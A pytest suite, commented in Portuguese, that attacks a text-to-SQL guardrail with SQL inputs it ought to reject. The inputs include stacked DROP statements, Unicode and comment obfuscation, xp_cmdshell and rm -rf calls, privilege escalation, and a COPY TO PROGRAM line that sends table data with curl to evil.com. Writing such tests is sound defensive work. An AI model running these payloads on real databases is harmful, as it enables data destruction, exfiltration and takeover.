# -*- coding: utf-8 -*-
"""
Suite adversarial para o guardrail `validate_sql`.

Objetivo: tentar QUEBRAR a validação, ou seja, encontrar SQLs que
DEVERIAM ser bloqueados (por alterarem o banco, escaparem de
allowed_tables, ou terem efeitos colaterais) mas que a função
aceita (retorna o sql em vez de lançar exceção).

Como usar:
    1. Ajuste o import abaixo para apontar para o módulo real.
    2. Rode: pytest test_validate_sql_bypass.py -v
    3. Qualquer teste que FALHAR indica um bypass real do guardrail
       (a função deveria ter lançado exceção e não lançou).

Convenção adotada nos testes:
    - `assert_blocked(...)`  -> espera que validate_sql lance exceção
    - `assert_allowed(...)`  -> espera que validate_sql NÃO lance
      (sanity check, para garantir que o guardrail não é falso-positivo
      a ponto de travar uso legítimo)

Cada classe de teste documenta a técnica de bypass sendo explorada,
para que sirva também como checklist de revisão manual do código
de `validate_sql`, não só como suite automatizada.
"""

import pytest

from txt2sql.guardrail import validate_sql  # noqa: E402


def assert_blocked(sql, dialect=None, allowed_tables=None, msg=""):
    """Espera que o guardrail rejeite o SQL (lançando qualquer Exception)."""
    with pytest.raises(Exception):
        validate_sql(sql, dialect=dialect, allowed_tables=allowed_tables)
    # Se chegou aqui, bloqueou corretamente.


def assert_allowed(sql, dialect=None, allowed_tables=None):
    """Espera que o guardrail aceite o SQL e devolva o próprio sql."""
    result = validate_sql(sql, dialect=dialect, allowed_tables=allowed_tables)
    assert result is not None


# ===========================================================================
# 1. STACKED / MULTI-STATEMENTS
#    Empilhar um DML/DDL malicioso depois de um SELECT inofensivo.
# ===========================================================================
class TestStackedStatements:

    @pytest.mark.parametrize("sql", [
        "SELECT * FROM users; DROP TABLE users;",
        "SELECT * FROM users; DELETE FROM users;",
        "SELECT 1; UPDATE users SET is_admin = true;",
        "SELECT 1;\nDROP TABLE users;",
        "SELECT 1;\tDROP TABLE users;",
        "SELECT 1;;;DROP TABLE users;",  # múltiplos ';'
        "SELECT 1; -- comentário\nDROP TABLE users;",
        "SELECT 1 ;DROP TABLE users",  # sem ';' final
        "  SELECT 1  ;  DROP TABLE users  ",  # espaços extras
    ])
    def test_semicolon_stacking(self, sql):
        assert_blocked(sql)

    def test_stacking_with_allowed_tables(self):
        # Mesmo se 'users' estiver liberada, o segundo statement
        # é destrutivo e não deveria passar.
        assert_blocked(
            "SELECT * FROM users; DROP TABLE users;",
            allowed_tables=["users"],
        )


# ===========================================================================
# 2. COMENTÁRIOS E OFUSCAÇÃO DE WHITESPACE
#    Quebrar keywords com comentários/espaços para escapar de regex ingênuos.
# ===========================================================================
class TestCommentsAndWhitespaceEvasion:

    @pytest.mark.parametrize("sql", [
        "DR/**/OP TABLE users",
        "DROP/**/TABLE users",
        "DE/**/LETE FROM users",
        "UPD/**/ATE users SET name = 'x'",
        "DROP\tTABLE users",
        "DROP\nTABLE users",
        "DROP\r\nTABLE users",
        "DROP     TABLE users",
        "/*comentário inicial*/ DROP TABLE users",
        "DROP TABLE /*obs*/ users",
        "-- comentário\nDROP TABLE users",
        "DROP TABLE users -- comentário final",
        "DROP TABLE users # comentário estilo mysql",
        "DR\u000bOP TABLE users",  # vertical tab escondido no meio da keyword
        "DROP\u00a0TABLE users",   # non-breaking space
    ])
    def test_comment_and_whitespace_obfuscation(self, sql):
        assert_blocked(sql)


# ===========================================================================
# 3. CASE / ENCODING TRICKS
# ===========================================================================
class TestCaseAndEncodingEvasion:

    @pytest.mark.parametrize("sql", [
        "DrOp TaBlE users",
        "dRoP tAbLe users",
        "DROP TABLE USERS",
        "drop table users",
        "DELETE\u0130 FROM users",  # 'İ' turco - trap de lower/upper case
    ])
    def test_case_variation(self, sql):
        assert_blocked(sql)


# ===========================================================================
# 4. CTEs / SUBQUERIES QUE MODIFICAM DADOS (Postgres/SQLite permitem
#    data-modifying CTEs disfarçados de SELECT no topo da query)
# ===========================================================================
class TestDataModifyingCTE:

    @pytest.mark.parametrize("sql", [
        "WITH del AS (DELETE FROM users RETURNING *) SELECT * FROM del;",
        "WITH upd AS (UPDATE users SET is_admin = true RETURNING id) SELECT * FROM upd;",
        "WITH ins AS (INSERT INTO users(name) VALUES ('x') RETURNING id) SELECT * FROM ins;",
        # CTE aninhada
        "WITH a AS (SELECT 1), b AS (DELETE FROM users RETURNING *) SELECT * FROM a, b;",
        # Statement puramente de SELECT no nome, mas o corpo interno modifica.
        "SELECT * FROM (DELETE FROM users RETURNING *) AS t;",
    ])
    def test_data_modifying_cte(self, sql):
        assert_blocked(sql, dialect="postgres")


# ===========================================================================
# 5. SELECT INTO / CREATE TABLE AS (cria/altera estrutura mesmo parecendo leitura)
# ===========================================================================
class TestSelectIntoCreatesState:

    @pytest.mark.parametrize("sql", [
        "SELECT * INTO new_table FROM users",  # T-SQL / Postgres
        "SELECT * INTO OUTFILE '/tmp/dump.csv' FROM users",  # MySQL - exfiltra pra disco
        "CREATE TABLE backup_users AS SELECT * FROM users",
        "CREATE TEMP TABLE tmp AS SELECT * FROM users",
        "CREATE VIEW v_users AS SELECT * FROM users",
    ])
    def test_select_into_variants(self, sql):
        assert_blocked(sql)


# ===========================================================================
# 6. FUNÇÕES COM EFEITO COLATERAL CHAMADAS DENTRO DE UM "SELECT"
#    (parece leitura, mas a função executa ação real no servidor/SO)
# ===========================================================================
class TestSideEffectFunctionsInsideSelect:

    @pytest.mark.parametrize("sql,dialect", [
        ("SELECT pg_terminate_backend(pid) FROM pg_stat_activity", "postgres"),
        ("SELECT pg_reload_conf()", "postgres"),
        ("SELECT lo_import('/etc/passwd')", "postgres"),
        ("SELECT dblink_exec('dbname=x', 'DELETE FROM users')", "postgres"),
        ("SELECT setval('users_id_seq', 1, false)", "postgres"),
        ("SELECT sys_exec('rm -rf /')", "postgres"),  # extensão, se existir
        ("SELECT * FROM OPENROWSET('SQLNCLI', 'evil')", "mssql"),
        ("SELECT xp_cmdshell('whoami')", "mssql"),
        ("EXEC sp_executesql N'DELETE FROM users'", "mssql"),
        ("SELECT UTL_HTTP.REQUEST('http://evil')", "oracle"),
        ("CALL some_write_procedure()", None),
    ])
    def test_side_effect_functions(self, sql, dialect):
        assert_blocked(sql, dialect=dialect)


# ===========================================================================
# 7. DDL, DCL, e comandos de administração disfarçados/variados
# ===========================================================================
class TestDDLandDCLVariants:

    @pytest.mark.parametrize("sql", [
        "TRUNCATE TABLE users",
        "TRUNCATE users",
        "ALTER TABLE users ADD COLUMN hacked BOOLEAN",
        "ALTER TABLE users DROP COLUMN password",
        "RENAME TABLE users TO users_old",
        "GRANT ALL PRIVILEGES ON users TO PUBLIC",
        "REVOKE SELECT ON users FROM analyst",
        "LOCK TABLE users IN ACCESS EXCLUSIVE MODE",
        "MERGE INTO users USING staging ON users.id = staging.id "
        "WHEN MATCHED THEN UPDATE SET users.name = staging.name",
        "REPLACE INTO users (id, name) VALUES (1, 'x')",  # MySQL: insert-or-update
        "COMMENT ON TABLE users IS 'pwned'",
        "VACUUM FULL users",
        "REINDEX TABLE users",
    ])
    def test_ddl_dcl_admin_statements(self, sql):
        assert_blocked(sql)


# ===========================================================================
# 8. BLOCOS PROCEDURAIS / EXECUÇÃO DINÂMICA
#    O parser pode não enxergar DML dentro de um bloco DO/BEGIN...END.
# ===========================================================================
class TestProceduralBlocksAndDynamicSQL:

    @pytest.mark.parametrize("sql,dialect", [
        ("DO $$ BEGIN DELETE FROM users; END $$;", "postgres"),
        ("BEGIN; DELETE FROM users; COMMIT;", "postgres"),
        ("EXECUTE IMMEDIATE 'DELETE FROM users'", "oracle"),
        ("PREPARE stmt FROM 'DELETE FROM users'; EXECUTE stmt;", "mysql"),
        ("SELECT query_to_xml('DELETE FROM users', false, false, '')", "postgres"),
    ])
    def test_dynamic_and_procedural_sql(self, sql, dialect):
        assert_blocked(sql, dialect=dialect)


# ===========================================================================
# 9. BYPASS DE allowed_tables
#    Query é "SELECT" legítimo, mas acessa/mistura tabelas fora da whitelist.
# ===========================================================================
class TestAllowedTablesBypass:

    def test_join_with_table_outside_allowlist(self):
        assert_blocked(
            "SELECT u.* FROM users u JOIN salaries s ON u.id = s.user_id",
            allowed_tables=["users"],
        )

    def test_union_with_table_outside_allowlist(self):
        assert_blocked(
            "SELECT id FROM users UNION SELECT id FROM salaries",
            allowed_tables=["users"],
        )

    def test_subquery_table_outside_allowlist(self):
        assert_blocked(
            "SELECT * FROM users WHERE id IN (SELECT user_id FROM salaries)",
            allowed_tables=["users"],
        )

    def test_schema_qualified_name_bypass(self):
        # Se o guardrail compara só o nome "users" sem schema, um nome
        # totalmente qualificado ou schema diferente pode escapar do match.
        assert_blocked(
            "SELECT * FROM other_schema.users",
            allowed_tables=["users"],
        )

    def test_quoted_identifier_case_bypass(self):
        # Identificador entre aspas é case-sensitive em Postgres;
        # allowed_tables=['users'] pode não bater com "Users".
        assert_blocked(
            'SELECT * FROM "Users"',
            allowed_tables=["users"],
            dialect="postgres",
        )

    def test_alias_disguising_real_table(self):
        assert_blocked(
            "SELECT s.* FROM salaries AS users_alias, users AS s",
            allowed_tables=["users"],
        )

    def test_cross_database_link_bypass(self):
        assert_blocked(
            "SELECT * FROM dblink('dbname=other', 'SELECT * FROM secrets') AS t(x text)",
            allowed_tables=["users"],
            dialect="postgres",
        )

    def test_information_schema_not_in_allowlist(self):
        # Tabela de metadados usada para reconhecimento não deveria vazar
        # se allowed_tables restringe explicitamente.
        assert_blocked(
            "SELECT table_name FROM information_schema.tables",
            allowed_tables=["users"],
        )


# ===========================================================================
# 10. ESPECIFICIDADES DE DIALETO (o parâmetro `dialect` pode ser ignorado
#     ou o parser pode não cobrir sintaxe vendor-specific)
# ===========================================================================
class TestDialectSpecificVectors:

    def test_mysql_load_data_infile(self):
        assert_blocked(
            "LOAD DATA INFILE '/etc/passwd' INTO TABLE users",
            dialect="mysql",
        )

    def test_mysql_into_outfile_exfiltration(self):
        assert_blocked(
            "SELECT * FROM users INTO OUTFILE '/tmp/leak.csv'",
            dialect="mysql",
        )

    def test_postgres_copy_program(self):
        # COPY ... TO/FROM PROGRAM executa comando arbitrário no host.
        assert_blocked(
            "COPY users TO PROGRAM 'curl -X POST -d @- http://evil.com'",
            dialect="postgres",
        )

    def test_sqlserver_batch_separator_go(self):
        # 'GO' não é T-SQL de verdade (separador de client), mas se o
        # guardrail só olha o primeiro statement antes de 'GO', o resto passa.
        assert_blocked(
            "SELECT 1\nGO\nDROP TABLE users\nGO",
            dialect="mssql",
        )

    def test_sqlite_attach_database(self):
        # ATTACH permite escrever em outro arquivo de banco via um SELECT lido como leitura.
        assert_blocked(
            "ATTACH DATABASE '/tmp/evil.db' AS evil",
            dialect="sqlite",
        )

    def test_oracle_plsql_anonymous_block(self):
        assert_blocked(
            "BEGIN EXECUTE IMMEDIATE 'DROP TABLE users'; END;",
            dialect="oracle",
        )

    def test_dialect_mismatch_wrong_dialect_declared(self):
        # SQL é MySQL mas o dialect passado é 'postgres' (ou vice-versa);
        # o parser pode falhar silenciosamente e deixar passar sem validar.
        assert_blocked(
            "REPLACE INTO users (id) VALUES (1)",
            dialect="postgres",  # dialect errado de propósito
        )


# ===========================================================================
# 11. UNICODE / HOMÓGLIFOS / NORMALIZAÇÃO
# ===========================================================================
class TestUnicodeAndHomoglyphEvasion:

    @pytest.mark.parametrize("sql", [
        # 'e' Cirílico (U+0435) no meio de DELETE
        "D\u0435LETE FROM users",
        # 'A' Cirílico (U+0410) em TABLE
        "DROP T\u0410BLE users",
        # caractere de largura total (fullwidth) imitando letras ASCII
        "\uFF24\uFF32\uFF2F\uFF30 TABLE users",  # "ＤＲＯＰ" fullwidth
        # zero-width space no meio da keyword
        "DR\u200bOP TABLE users",
        # BOM no início da string
        "\ufeffDROP TABLE users",
        # normalização NFKD/NFKC diferente do esperado
        "DROP TABLE u\u0073\u0065\u0072\u0073",
    ])
    def test_unicode_tricks(self, sql):
        assert_blocked(sql)


# ===========================================================================
# 12. SEPARADORES E TERMINADORES ALTERNATIVOS / CONTROL CHARS
# ===========================================================================
class TestAlternateSeparatorsAndControlChars:

    @pytest.mark.parametrize("sql", [
        "SELECT 1\x00; DROP TABLE users;",  # null byte
        "SELECT 1\\gDROP TABLE users",       # \g (client shortcut mysql)
        "SELECT 1\x1a DROP TABLE users",     # substitute char (SUB, usado em bypass histórico)
        "SELECT 1\r; DROP TABLE users;",
    ])
    def test_control_char_and_alt_separators(self, sql):
        assert_blocked(sql)


# ===========================================================================
# 13. SESSÃO / CONFIGURAÇÃO QUE ALTERA COMPORTAMENTO DE SEGURANÇA
#     Não é "DML" clássico, mas muda estado do servidor/sessão.
# ===========================================================================
class TestSessionAndPrivilegeEscalation:

    @pytest.mark.parametrize("sql,dialect", [
        ("SET SESSION AUTHORIZATION admin", "postgres"),
        ("SET ROLE admin", "postgres"),
        ("SET GLOBAL read_only = 0", "mysql"),
        ("ALTER SYSTEM SET shared_buffers = '1GB'", "postgres"),
        ("ALTER USER admin WITH PASSWORD 'novasenha'", "postgres"),
        ("CREATE USER hacker WITH SUPERUSER PASSWORD 'x'", "postgres"),
    ])
    def test_session_and_privilege_statements(self, sql, dialect):
        assert_blocked(sql, dialect=dialect)


# ===========================================================================
# 14. SANITY CHECKS (o guardrail não pode ser tão agressivo a ponto de
#     bloquear leitura legítima — falso positivo também é bug)
# ===========================================================================
class TestSanitySelectsShouldPass:

    @pytest.mark.parametrize("sql", [
        "SELECT * FROM users",
        "SELECT id, name FROM users WHERE id = 1",
        "SELECT u.id FROM users u JOIN orders o ON u.id = o.user_id",
        "SELECT COUNT(*) FROM users",
        "WITH recent AS (SELECT * FROM users WHERE created_at > now() - interval '1 day') "
        "SELECT * FROM recent",
    ])
    def test_plain_select_allowed(self, sql):
        assert_allowed(sql)

    def test_select_restricted_to_allowed_table(self):
        assert_allowed(
            "SELECT * FROM users WHERE id = 1",
            allowed_tables=["users"],
        )